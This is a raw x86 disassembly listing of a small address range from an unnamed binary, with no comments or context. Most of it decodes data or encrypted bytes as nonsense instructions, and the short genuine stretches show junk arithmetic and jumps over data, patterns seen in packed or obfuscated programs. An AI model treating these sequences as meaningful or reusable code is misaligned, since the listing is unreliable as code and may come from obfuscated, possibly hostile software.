  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	test   DWORD PTR [ecx],0x8753ff85
  409a5e:	in     al,dx
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409ab4
  409a66:	lock in al,dx
  409a68:	mov    BYTE PTR ds:0x8152a2bd,bh
  409a6e:	xor    eax,0x48aeaecb
  409a73:	std    
  409a74:	jge    0x409a99
  409a76:	adc    DWORD PTR [ebp-0x2],0xc14dc069
  409a7d:	inc    ebp
  409a7e:	inc    ebp
  409a7f:	dec    eax
  409a80:	fisttp WORD PTR [eax]
  409a82:	jnp    0x409aa2
  409a84:	adc    al,0x71
  409a86:	iret   
  409a87:	sahf   
  409a88:	xchg   ebp,eax
  409a89:	loope  0x409a5b
  409a8b:	dec    eax
  409a8c:	adc    al,0x6b
  409a8e:	(bad)  
  409a8f:	icebp  
  409a90:	inc    ebp
  409a91:	imul   BYTE PTR [esi-0x52]
  409a94:	shl    DWORD PTR [ecx],cl
  409a96:	stc    
  409a97:	les    edi,FWORD PTR [ebx]
  409a99:	aad    0x5c
  409a9b:	aas    
  409a9c:	sub    eax,0xf7f97449
  409aa1:	aad    0x4e
  409aa3:	aas    
  409aa4:	cdq    
  409aa5:	out    dx,al
  409aa6:	outs   dx,DWORD PTR ds:[esi]
  409aa7:	cmp    cl,dh
  409aa9:	loop   0x409ae3
  409aab:	stos   DWORD PTR es:[edi],eax
  409aac:	adc    esp,esp
  409aae:	out    dx,eax
  409aaf:	hlt    
  409ab0:	das    
  409ab1:	mov    ch,0x5d
  409ab3:	test   ah,0xe
  409ab6:	rsqrtps xmm0,xmm1
  409ab9:	ds fucom st(1)
  409abc:	jbe    0x409a43
  409abe:	adc    ecx,DWORD PTR [ebp-0x70]
  409ac1:	call   0xcf43374a
  409ac6:	test   al,0x48
  409ac8:	fcomp  QWORD PTR [edx]
  409aca:	lock adc DWORD PTR [ebp+0x39],ebp
  409ace:	es aam 0x8c
  409ad1:	cmp    DWORD PTR [ecx+ebp*1+0x2b],0xe727a3c8
  409ad9:	retf   0xbb29
  409adc:	sub    eax,0x64656e1
  409ae1:	mov    bh,0xf8
  409ae3:	scas   al,BYTE PTR es:[edi]
  409ae4:	xor    BYTE PTR [eax+ebp*4+0x6eb2b112],cl
  409aeb:	xor    bh,bl
  409aed:	mov    eax,DWORD PTR [ebx+0x288767b0]
  409af3:	push   ss
  409af4:	test   eax,0x9c62ccd8
  409af9:	fadd   QWORD PTR [edi-0x41]
  409afc:	adc    ah,BYTE PTR [eax]
  409afe:	add    eax,DWORD PTR [eax+0x2cff9459]
  409b04:	or     DWORD PTR [eax+0x42],esp
  409b07:	mov    edx,0x7e0bca4b
  409b0c:	gs jb  0x409b74
  409b0f:	out    dx,al
  409b10:	leave  
  409b11:	xor    ebp,edi
  409b13:	in     eax,dx
  409b14:	rol    DWORD PTR [ebp+0x6516d5f],1
  409b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b1b:	stos   DWORD PTR es:[edi],eax
  409b1c:	ja     0x409b66
  409b1e:	cdq    
  409b1f:	and    BYTE PTR [esi-0x39],ah
  409b22:	xchg   DWORD PTR [esi+0x594837f],ebp
  409b28:	nop
  409b29:	jmp    0xd504439b
  409b2e:	out    0x36,al
  409b30:	test   DWORD PTR [ebx-0x18],eax
  409b33:	mov    dh,0x28
  409b35:	push   0xffffff88
  409b37:	aad    0xa4
  409b39:	pop    ss
  409b3a:	aad    0xc9
  409b3c:	mov    WORD PTR [edx-0x7c],es
  409b3f:	pop    edx
  409b40:	jbe    0x409acb
  409b42:	into   
  409b43:	pop    eax
  409b44:	sahf   
  409b45:	stos   DWORD PTR es:[edi],eax
  409b46:	jg     0x409b07
  409b48:	add    DWORD PTR [edx],esp
  409b4a:	mov    ebp,0x545f7903
  409b4f:	jno    0x409aec
  409b51:	push   0xffffffbf
  409b53:	mov    al,ds:0x2dd2f972
  409b58:	imul   DWORD PTR [edx]
  409b5a:	ins    DWORD PTR es:[edi],dx
  409b5b:	mov    esi,0x3e4624d9
  409b60:	int    0x99
  409b62:	push   esp
  409b63:	sti    
  409b64:	and    edi,ebx
  409b66:	(bad)  
  409b67:	dec    edi
  409b68:	ret    0x7fd7
  409b6b:	(bad)  
  409b6d:	test   BYTE PTR [ebx-0x589029ce],0x79
  409b74:	imul   BYTE PTR [esi]
  409b76:	adc    BYTE PTR [edi+0x10],cl
  409b79:	jb     0x409b1e
  409b7b:	sub    ecx,DWORD PTR [di+0x200]
  409b80:	retf   
  409b81:	jnp    0x409b59
  409b83:	imul   esp,DWORD PTR [edi+ecx*1-0x71],0xc516f867
  409b8b:	ins    DWORD PTR es:[edi],dx
  409b8c:	add    BYTE PTR [ecx],bh
  409b8e:	jl     0x409b65
  409b90:	inc    ecx
  409b91:	repnz add DWORD PTR [edi+0x46],ecx
  409b95:	sub    eax,0x5400dafe
  409b9b:	lea    eax,ds:0x44a03880
  409ba1:	push   0x32
  409ba3:	pop    DWORD PTR [ebp+0x4f2468e]
  409ba9:	jl     0x409b9d
  409bab:	jno    0x409b5c
  409bad:	ret    
  409bae:	hlt    
  409baf:	dec    eax
  409bb0:	fadd   DWORD PTR [edi]
  409bb2:	push   0xbc5711b9
  409bb7:	xor    bl,BYTE PTR [ecx+0x155e350]
  409bbd:	mov    eax,0xafa5a067
  409bc2:	cmp    edx,DWORD PTR [edi-0x58f7bdba]
  409bc8:	aas    
  409bc9:	xchg   esp,eax
  409bca:	cmp    BYTE PTR [edi],ch
  409bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bcd:	jp     0x409bdc
  409bcf:	mov    eax,0x7b31effc
  409bd4:	cmp    BYTE PTR [ebx],ah
  409bd6:	jl     0x409c03
  409bd8:	js     0x409c1a
  409bda:	push   eax
  409bdb:	jge    0x409b63
  409bdd:	sbb    al,0x8
  409bdf:	fisub  DWORD PTR [ecx+0x76]
  409be2:	xchg   DWORD PTR [ebx],edx
  409be4:	jmp    0x409bb0
  409be6:	dec    ecx
  409be7:	xor    esp,DWORD PTR [eax+ebx*1-0x12]
  409beb:	jmp    0x409c69
  409bed:	push   esp
  409bee:	xchg   ebx,eax
  409bef:	jae    0x409bbe
  409bf1:	imul   ebp,DWORD PTR [edi],0x9e94ec91
  409bf7:	push   esp
  409bf8:	mov    ebp,0xe33c3a8d
  409bfd:	sub    edx,DWORD PTR [ebx-0x4a377624]
  409c03:	sbb    ecx,DWORD PTR [ebx+0x83e327a]
  409c09:	outs   dx,BYTE PTR ds:[esi]
  409c0a:	push   0x6bd819f8
  409c0f:	jae    0x409c0c
  409c11:	imul   edx,DWORD PTR [eax+0x4906eb07],0x6dfdbc6f
  409c1b:	pushf  
  409c1c:	and    BYTE PTR [ebx+esi*1-0x2b],ch
  409c20:	and    DWORD PTR [ebx+0x43],esi
  409c23:	aad    0x26
  409c25:	dec    edx
  409c26:	in     eax,0xd4
  409c28:	push   edi
  409c29:	ds sub eax,0xe8ad7017
  409c2f:	test   al,0xd0
  409c31:	hlt    
  409c32:	sbb    dh,ah
  409c34:	in     eax,0x4b
  409c36:	mov    ebx,DWORD PTR [edx-0x1cac7e46]
  409c3c:	mov    BYTE PTR [esi],0xbe
  409c3f:	int3   
  409c40:	push   esi
  409c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c42:	jecxz  0x409cad
  409c44:	mov    edi,0x4dc860f7
  409c49:	cmp    BYTE PTR [ebx],ah
  409c4b:	adc    BYTE PTR [ecx+0x38],0xd2
  409c4f:	pop    esp
  409c50:	push   esp
  409c51:	stc    
  409c52:	sbb    edi,DWORD PTR [ecx+ebp*8+0x4c9b5e44]
  409c59:	sbb    dh,BYTE PTR [ecx]
  409c5b:	sub    dh,BYTE PTR [ebx+ecx*8-0x64]
  409c5f:	int3   
  409c60:	mov    cl,0x82
  409c62:	sbb    eax,DWORD PTR [di+0x4457]
  409c67:	add    edx,DWORD PTR [esi]
  409c69:	or     DWORD PTR [eax+0x56],0x1f4b29a1
  409c70:	or     eax,0xb55b4f13
  409c75:	test   BYTE PTR [edx],al
  409c77:	sbb    eax,0x1f1786b2
  409c7c:	fwait
  409c7d:	out    dx,al
  409c7e:	clc    
  409c7f:	push   0xa02ddbe2
  409c84:	dec    eax
  409c85:	cli    
  409c86:	pusha  
  409c87:	das    
  409c88:	and    al,0xc5
  409c8a:	fs enter 0x3f48,0xb1
  409c8f:	ins    DWORD PTR es:[edi],dx
  409c90:	adc    BYTE PTR [eax+eax*4+0x13f5b1a6],bl
  409c97:	ret    
  409c98:	jmp    0x409ca6
  409c9a:	bound  eax,QWORD PTR [edi-0x4febbaa0]
  409ca0:	push   ecx
  409ca1:	lods   al,BYTE PTR ds:[esi]
  409ca2:	sar    bl,1
  409ca4:	ror    DWORD PTR ds:0xec5aaba5,0xe5
  409cab:	les    esi,FWORD PTR [ecx]
  409cad:	imul   esi,DWORD PTR [edx+0x23f06e5f],0xffffffc2
  409cb4:	sub    BYTE PTR fs:[esi+edi*1],cl
  409cb8:	sahf   
  409cb9:	jae    0x409ca8
  409cbb:	jmp    0x1edd:0xb66fdbae
  409cc2:	ret    
  409cc3:	ins    BYTE PTR es:[edi],dx
  409cc4:	stos   DWORD PTR es:[edi],eax
  409cc5:	dec    ebp
  409cc6:	cld    
  409cc7:	push   ss
  409cc8:	sub    edx,esp
  409cca:	sbb    BYTE PTR [ecx],bh
  409ccc:	mov    cl,0x74
  409cce:	test   DWORD PTR [eax-0x1b4f4c54],esp
  409cd4:	adc    esi,DWORD PTR [ecx]
  409cd6:	jle    0x409cbd
  409cd8:	in     eax,dx
  409cd9:	and    dh,BYTE PTR [edx+0xad8c3e3]
  409cdf:	mov    edx,0x4018b6f3
  409ce4:	push   esp
  409ce5:	adc    ah,bh
  409ce7:	sub    al,0x53
  409ce9:	push   0x1efe43a3
  409cee:	dec    ebx
  409cef:	xchg   ebp,eax
  409cf0:	pop    ds
  409cf1:	adc    BYTE PTR [ebp+0xe339542],dl
  409cf7:	xchg   ebp,eax
  409cf8:	adc    edx,ebp
  409cfa:	stc    
  409cfb:	mov    esp,0xe3c8ede0
  409d00:	aam    0xfd
  409d02:	in     eax,0xa8
  409d04:	fs aam 0xf5
  409d07:	mov    dh,0x6c
  409d09:	daa    
  409d0a:	pop    es
  409d0b:	and    edx,DWORD PTR [esi+0x77012341]
  409d11:	mov    BYTE PTR [esi+0x3a],ch
  409d14:	cmp    al,0x63
  409d16:	sub    cl,cl
  409d18:	das    
  409d19:	adc    eax,0x2652c510
  409d1e:	sbb    eax,0xd59470b
  409d23:	(bad)  
  409d24:	cmp    eax,0x71883e36
  409d29:	test   al,0xab
  409d2b:	scas   eax,DWORD PTR es:[edi]
  409d2c:	sub    bh,dh
  409d2e:	push   edx
  409d2f:	in     eax,dx
  409d30:	push   ds
  409d31:	cmp    ecx,ecx
  409d33:	or     eax,0xd7c47d3
  409d38:	ret    
  409d39:	jp     0x409d69
  409d3b:	xor    al,BYTE PTR [edi-0x44]
  409d3e:	mov    eax,0x39879c4a
  409d43:	xchg   ebx,eax
  409d44:	retf   0x95a5
  409d47:	adc    ebp,DWORD PTR [eax]
  409d49:	das    
  409d4a:	mov    eax,0x840912c3
  409d4f:	mov    ds:0x9a5f341d,al
  409d54:	(bad)  
  409d56:	mov    dl,0xc5
  409d58:	loop   0x409ce0
  409d5a:	ja     0x409d97
  409d5c:	pusha  
  409d5d:	div    ebp
  409d5f:	push   ebx
  409d60:	in     eax,dx
  409d61:	pop    esi
  409d62:	ds stos BYTE PTR es:[edi],al
  409d64:	addr16 in al,dx
  409d66:	das    
  409d67:	mov    fs,WORD PTR [edx+edi*4]
  409d6a:	jmp    0xd876f4a4
  409d6f:	and    cl,BYTE PTR [ebx-0x3e40ed40]
  409d75:	loope  0x409da2
  409d77:	mov    dh,0x4b
  409d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d7a:	hlt    
  409d7b:	mov    esp,0xed912f17
  409d80:	jp     0x409df4
  409d82:	xor    ebp,ebp
  409d84:	mov    esi,0x2f052f29
  409d89:	mov    eax,ds:0xa503ee59
  409d8e:	fldcw  WORD PTR [ebx-0x7e]
  409d91:	and    ah,BYTE PTR [ecx-0x3a]
  409d94:	cmp    DWORD PTR [edi-0x7],edi
  409d97:	enter  0x999d,0x71
  409d9b:	loopne 0x409d66
  409d9d:	cmp    al,0x71
  409d9f:	inc    BYTE PTR [esi-0x33]
  409da2:	adc    ch,BYTE PTR [esp+esi*4]
  409da5:	sub    ch,bl
  409da7:	jle    0x409dda
  409da9:	add    BYTE PTR [edx+esi*2+0x64],al
  409dad:	mov    ebx,0xffae0476
  409db2:	add    DWORD PTR [edx+0x1a8da690],edi
  409db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409db9:	int3   
  409dba:	cmp    al,0x92
  409dbc:	jo     0x409de7
  409dbe:	scas   al,BYTE PTR es:[edi]
  409dbf:	loope  0x409d42
  409dc1:	call   0x964eae46
  409dc6:	pop    edi
  409dc7:	in     al,dx
  409dc8:	fs pop edi
  409dca:	cmp    eax,0x874dd8f7
  409dcf:	adc    DWORD PTR [ebp+0x20],0xffffffe2
  409dd3:	pushf  
  409dd4:	jge    0x409db4
  409dd6:	pop    esi
  409dd7:	sub    DWORD PTR [edi+eax*4+0x53ac9a64],edi
  409dde:	stc    
  409ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409de0:	push   0xa9229374
  409de5:	mov    edi,DWORD PTR [edi]
  409de7:	jne    0x409d77
  409de9:	outs   dx,DWORD PTR ds:[esi]
  409dea:	mov    eax,ds:0x837f63d5
  409def:	int3   
  409df0:	pop    esi
  409df1:	ds out 0xcd,eax
  409df4:	pop    ecx
  409df5:	jg     0x409ddb
  409df7:	jo     0x409d91
  409df9:	xchg   ebp,eax
  409dfa:	loop   0x409d9d
  409dfc:	stos   BYTE PTR es:[edi],al
  409dfd:	scas   al,BYTE PTR es:[edi]
  409dfe:	cmp    ebp,DWORD PTR [ebp-0x4db6d9ea]
  409e04:	ins    BYTE PTR es:[edi],dx
  409e05:	pop    ebx
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fd8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	mov    DWORD PTR [edx-0x59],0xe826f3d9
  409e87:	jo     0x409ef9
  409e89:	lahf   
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409ee5
  409e8e:	bound  esp,QWORD PTR gs:[ecx-0x37]
  409e92:	shl    DWORD PTR [edx],1
  409e94:	mov    DWORD PTR [edi-0x3c],edx
  409e97:	ret    0xc2b9
  409e9a:	push   0x7b1b5825
  409e9f:	mov    ebp,0x293972a
  409ea4:	dec    edx
  409ea5:	in     eax,dx
  409ea6:	cmp    eax,0x6b67ba19
  409eab:	fld    TBYTE PTR [edx-0xe2c9cce]
  409eb1:	fwait
  409eb2:	lods   al,BYTE PTR ds:[esi]
  409eb3:	sar    edx,0x5d
  409eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb7:	jmp    0x5c1398ba
  409ebc:	mov    ch,0x91
  409ebe:	add    ah,BYTE PTR [ecx+0x27368da6]
  409ec4:	mov    al,ds:0xc2551902
  409ec9:	mov    DWORD PTR [edx-0x2992138c],esi
  409ecf:	jge    0x409ee6
  409ed1:	mov    BYTE PTR [edx+esi*1-0xc],cl
  409ed5:	cmp    al,0x84
  409ed7:	add    al,0x25
  409ed9:	scas   al,BYTE PTR es:[edi]
  409eda:	add    esi,DWORD PTR [esi-0x73]
  409edd:	mov    edx,0x44c0d3aa
  409ee2:	(bad)  
  409ee3:	jp     0x409f2a
  409ee5:	or     ah,cl
  409ee7:	repnz push ebx
  409ee9:	jp     0x409f13
  409eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eec:	jns    0x409f0f
  409eee:	gs and al,0x65
  409ef1:	ja     0x409f44
  409ef3:	jmp    0x9e6e:0x50d1d29a
  409efa:	mov    eax,es:0x7ccd7395
  409f00:	add    bl,BYTE PTR ds:0xad7d7097
  409f06:	jecxz  0x409f2b
  409f08:	pop    edi
  409f09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f0a:	repz ror ecx,1
  409f0d:	rcr    BYTE PTR [esi-0x5b262c9f],1
  409f13:	mov    BYTE PTR [ebx-0x354a0b56],dl
  409f19:	nop
  409f1a:	nop
  409f1b:	outs   dx,DWORD PTR ds:[esi]
  409f1c:	adc    dh,BYTE PTR cs:[esi+ebp*4]
  409f20:	xor    ebx,DWORD PTR [ecx]
  409f22:	pop    edi
  409f23:	or     BYTE PTR [edx],al
  409f25:	je     0x409f34
  409f27:	mov    bh,0xb0
  409f29:	test   eax,ebp
  409f2b:	jecxz  0x409f24
  409f2d:	push   ebx
  409f2e:	jecxz  0x409f48
  409f30:	shl    BYTE PTR [esi-0x33dfef53],1
  409f36:	and    BYTE PTR [eax+0xa148594],0x49
  409f3d:	in     al,dx
  409f3e:	and    DWORD PTR [eax+ebp*2-0x6cfe4b82],ebx
  409f45:	mov    al,ds:0x223f19bc
  409f4a:	jg     0x409f58
  409f4c:	push   0x6a
  409f4e:	sub    ch,dh
  409f50:	ret    0x7437
  409f53:	stos   DWORD PTR es:[edi],eax
  409f54:	mov    ecx,0x41d0223e
  409f59:	pushf  
  409f5a:	ret    0x74f3
  409f5d:	sub    edi,esi
  409f5f:	add    dl,BYTE PTR [esi-0x69]
  409f62:	jp     0x409f34
  409f64:	imul   eax,DWORD PTR [ecx+ebx*4+0x6d],0x7d
  409f69:	push   0x2b
  409f6b:	jg     0x409eed
  409f6d:	push   ebp
  409f6e:	mov    ecx,0x8de069e8
  409f73:	out    0x17,eax
  409f75:	mov    eax,0xae045841
  409f7a:	and    bh,BYTE PTR [ebx+0x7128fd4e]
  409f80:	loope  0x409f6f
  409f82:	pusha  
  409f83:	adc    esi,DWORD PTR [eax+0x2b06ca36]
  409f89:	dec    ecx
  409f8a:	push   edx
  409f8b:	icebp  
  409f8c:	std    
  409f8d:	mov    al,ds:0xe8c8e687
  409f92:	mov    dl,0x2f
  409f94:	mov    ecx,0x695df604
  409f99:	dec    eax
  409f9a:	or     al,0x39
  409f9c:	dec    ebp
  409f9d:	and    BYTE PTR [esp+eax*1-0x3eb27c07],ch
  409fa4:	stos   BYTE PTR es:[edi],al
  409fa5:	rol    DWORD PTR [ebx],1
  409fa7:	imul   esp,DWORD PTR [ebx+0x17],0x279810a3
  409fae:	xor    DWORD PTR [ebx-0x41],ecx
  409fb1:	ds iret 
  409fb3:	dec    ecx
  409fb4:	pop    eax
  409fb5:	xor    eax,0x8230544f
  409fba:	jnp    0x40a015
  409fbc:	pop    esi
  409fbd:	adc    BYTE PTR [ebp-0x51],0x2b
  409fc1:	lds    edx,FWORD PTR fs:[ebp+0x4b358ed4]
  409fc8:	js     0x409fae
  409fca:	xor    dl,BYTE PTR [edx+0x52]
  409fcd:	out    0x99,eax
  409fcf:	jo     0x409f75
  409fd1:	xor    dh,ah
  409fd3:	clc    
  409fd4:	ins    BYTE PTR es:[edi],dx
  409fd5:	cmp    BYTE PTR [ebp+0x10f82fc1],0xdd
  409fdc:	int3   
  409fdd:	sar    ah,1
  409fdf:	ins    DWORD PTR es:[edi],dx
  409fe0:	test   eax,0xb2c2ac51
  409fe5:	outs   dx,DWORD PTR ds:[esi]
  409fe6:	in     eax,dx
  409fe7:	xor    dh,BYTE PTR [edx+eiz*1+0x43]
  409feb:	or     al,0x23
  409fed:	mov    esi,0xda2be490
  409ff2:	xlat   BYTE PTR ds:[ebx]
  409ff3:	xchg   ecx,eax
  409ff4:	sbb    DWORD PTR [edi+0x45397674],edx
  409ffa:	stc    
  409ffb:	ret    
  409ffc:	jp     0x40a01b
  409ffe:	int    0xe9
  40a000:	call   0x6809:0x6879f4f7
  40a007:	out    0x9d,al
  40a009:	imul   ebp,esi,0xfffffffa
  40a00c:	jmp    0x48c4:0xdd2ac76f
  40a013:	loopne 0x40a072
  40a015:	mov    edx,0x2d6181cc
  40a01a:	jmp    0xc3b874da
  40a01f:	iret   
  40a020:	lock sbb esi,DWORD PTR [edx]
  40a023:	ret    
  40a024:	push   cs
  40a025:	jns    0x409feb
  40a027:	xor    eax,DWORD PTR [edi-0x64]
  40a02a:	mov    cs,WORD PTR [edi+0x430709aa]
  40a030:	cld    
  40a031:	loop   0x40a037
  40a033:	ja     0x409fd8
  40a035:	pop    ss
  40a036:	jne    0x40a07e
  40a038:	jne    0x40a071
  40a03a:	sbb    esp,eax
  40a03c:	mov    BYTE PTR [eax-0x4d],bh
  40a03f:	mov    edi,0xdd3bf6bf
  40a044:	inc    eax
  40a045:	mov    dh,0x9d
  40a047:	or     bl,0x27
  40a04a:	clc    
  40a04b:	mov    ebp,0xff005857
  40a050:	fs and eax,0xc4e42d4b
  40a056:	icebp  
  40a057:	imul   BYTE PTR [ebx]
  40a059:	fldenv [eax+0x7d]
  40a05c:	imul   ebp,DWORD PTR [ebp-0xd94a769],0x35ee6d41
  40a066:	fidivr DWORD PTR ds:0xb658cb1b
  40a06c:	dec    edi
  40a06d:	add    esp,0x56
  40a070:	push   esp
  40a071:	fwait
  40a072:	xchg   ebp,eax
  40a073:	enter  0x26f1,0x1f
  40a077:	ss clc 
  40a079:	int    0xc2
  40a07b:	pop    ds
  40a07c:	ins    DWORD PTR es:[edi],dx
  40a07d:	or     ah,BYTE PTR [edx+ebp*1-0x48db0c39]
  40a084:	imul   edi,DWORD PTR [ecx+0x16],0xbaa1caac
  40a08b:	call   eax
  40a08d:	mov    bh,0x4d
  40a08f:	scas   eax,DWORD PTR es:[edi]
  40a090:	xlat   BYTE PTR ds:[ebx]
  40a091:	ja     0x40a02e
  40a093:	aas    
  40a094:	sub    edx,edx
  40a096:	or     al,0xd
  40a098:	icebp  
  40a099:	push   edi
  40a09a:	fwait
  40a09b:	in     al,0xce
  40a09d:	aas    
  40a09e:	cs (bad) 
  40a0a0:	push   ds
  40a0a1:	ret    0x8a2d
  40a0a4:	out    dx,al
  40a0a5:	pop    edx
  40a0a6:	int    0x15
  40a0a8:	repnz nop DWORD PTR [ecx]
  40a0ac:	or     bh,bl
  40a0ae:	pop    esp
  40a0af:	or     al,0x31
  40a0b1:	inc    eax
  40a0b2:	jmp    0x7046:0x82199975
  40a0b9:	shl    BYTE PTR [esi+0x5c],0xc
  40a0bd:	adc    al,0xc2
  40a0bf:	int3   
  40a0c0:	sahf   
  40a0c1:	push   edx
  40a0c2:	xchg   esi,eax
  40a0c3:	or     BYTE PTR [ebp+0x14],dh
  40a0c6:	pop    ecx
  40a0c7:	adc    esi,DWORD PTR [esi-0x4cee74a5]
  40a0cd:	jb     0x40a063
  40a0cf:	dec    ebp
  40a0d0:	repnz jecxz 0x40a0cf
  40a0d3:	sub    al,0x39
  40a0d5:	inc    edx
  40a0d6:	sbb    al,0xa5
  40a0d8:	pop    es
  40a0d9:	popa   
  40a0da:	jbe    0x40a12c
  40a0dc:	pop    edx
  40a0dd:	scas   eax,DWORD PTR es:[edi]
  40a0de:	call   0xd96ddac3
  40a0e3:	(bad)  
  40a0e4:	arpl   WORD PTR [esi],ax
  40a0e6:	(bad)  
  40a0e8:	in     eax,0xa8
  40a0ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ec:	stos   DWORD PTR es:[edi],eax
  40a0ed:	ds mov esi,0x894f45c8
  40a0f3:	lahf   
  40a0f4:	es fwait
  40a0f6:	int    0x1f
  40a0f8:	mov    cl,0x27
  40a0fa:	fcomp  QWORD PTR [ebp-0x44a2d49]
  40a100:	push   eax
  40a101:	mov    esi,0xfc883757
  40a106:	int3   
  40a107:	push   ss
  40a108:	add    ah,ch
  40a10a:	mov    cl,0x5
  40a10c:	or     BYTE PTR [ecx],bh
  40a10e:	add    eax,0x1ec4770c
  40a113:	scas   al,BYTE PTR es:[edi]
  40a114:	add    DWORD PTR [ebx+eiz*1],eax
  40a117:	xchg   edi,eax
  40a118:	jle    0x40a169
  40a11a:	xchg   esp,eax
  40a11b:	ret    0xdde0
  40a11e:	add    DWORD PTR [edx],ebx
  40a120:	push   ebx
  40a121:	and    bh,BYTE PTR [ebx-0x7905adf9]
  40a127:	and    bh,BYTE PTR [ecx+ebp*1]
  40a12a:	popf   
  40a12b:	popf   
  40a12c:	sub    BYTE PTR [edi+0x5aa5b619],0x99
  40a133:	mov    ah,0x79
  40a135:	cmc    
  40a136:	stc    
  40a137:	retf   
  40a138:	jmp    0x40a15a
  40a13a:	push   ebx
  40a13b:	dec    esp
  40a13c:	push   esi
  40a13d:	push   edx
  40a13e:	mov    dh,0xad
  40a140:	mov    ebp,0x6abf1ce6
  40a145:	lock add al,0xb1
  40a148:	xchg   edx,eax
  40a149:	stos   DWORD PTR es:[edi],eax
  40a14a:	or     edx,DWORD PTR [edx]
  40a14c:	pop    ebx
  40a14d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a14e:	cmp    dl,BYTE PTR [edx+0x46]
  40a151:	xchg   edi,eax
  40a152:	enter  0x1258,0xba
  40a156:	icebp  
  40a157:	mov    dl,0x8
  40a159:	fnstcw WORD PTR [ebx-0x25ac0101]
  40a15f:	mov    ss,ecx
  40a161:	outs   dx,DWORD PTR ds:[esi]
  40a162:	pop    edi
  40a163:	into   
  40a164:	xchg   DWORD PTR [esp+edi*1-0x36],ebx
  40a168:	push   ebx
  40a169:	mov    eax,0x81f44a36
  40a16e:	sub    bh,ch
  40a170:	jle    0x40a1af
  40a172:	and    cl,0xb7
  40a175:	shl    edi,1
  40a177:	cmp    al,0x37
  40a179:	pop    esp
  40a17a:	icebp  
  40a17b:	xor    eax,edi
  40a17d:	xor    BYTE PTR [ebp+0x7d],0x82
  40a181:	stc    
  40a182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a183:	cmp    edi,edx
  40a185:	jl     0x40a200
  40a187:	cmp    BYTE PTR [ebx-0x14e9dffa],al
  40a18d:	outs   dx,DWORD PTR ds:[esi]
  40a18e:	cmp    ch,BYTE PTR [edx+ecx*1]
  40a191:	xor    DWORD PTR cs:[ebx],0xffffffa5
  40a195:	test   al,0xe9
  40a197:	cli    
  40a198:	fiadd  DWORD PTR [edx]
  40a19a:	div    esp
  40a19c:	add    bh,ah
  40a19e:	mov    bh,0x49
  40a1a0:	dec    esi
  40a1a1:	fcom   DWORD PTR [ecx-0x2ba65b7e]
  40a1a7:	sahf   
  40a1a8:	pop    edi
  40a1a9:	sbb    ch,bl
  40a1ab:	cwde   
  40a1ac:	inc    esp
  40a1ad:	xchg   edi,eax
  40a1ae:	hlt    
  40a1af:	xchg   ecx,eax
  40a1b0:	jg     0x40a179
  40a1b2:	ins    DWORD PTR es:[edi],dx
  40a1b3:	jmp    0xe6c59318
  40a1b8:	jecxz  0x40a1d1
  40a1ba:	loope  0x40a1ca
  40a1bc:	and    al,0x57
  40a1be:	data16 js 0x40a21b
  40a1c1:	stos   BYTE PTR es:[edi],al
  40a1c2:	loopne 0x40a196
